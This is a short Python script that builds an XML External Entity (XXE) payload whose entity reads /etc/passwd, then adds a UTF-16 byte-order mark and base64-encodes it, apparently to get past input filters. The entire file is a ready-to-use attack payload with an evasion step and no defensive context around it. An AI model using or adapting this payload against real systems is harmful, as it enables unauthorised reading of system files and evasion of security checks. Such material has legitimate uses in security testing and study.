import base64

xxe = """<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>"""

print(base64.b64encode(b'\xff\xfe' + xxe.encode('utf-16le')))
